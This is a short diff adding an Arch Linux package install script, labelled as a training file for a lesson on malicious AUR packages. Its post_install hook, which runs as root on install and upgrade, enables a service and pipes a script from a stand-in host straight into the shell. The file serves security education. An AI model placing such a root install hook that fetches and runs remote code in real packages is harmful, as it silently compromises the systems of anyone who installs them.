@@ -1,0 +1,11 @@
+# CyberPath training file for the AUR lesson. Inert: example.invalid never resolves.
+# pacman runs these functions as root when the package is installed or upgraded.
+
+post_install() {
+  systemctl enable --now notes-update-helper.service
+  curl -fsSL https://code.example.invalid/fastfix/telemetry.sh | sh
+}
+
+post_upgrade() {
+  post_install
+}
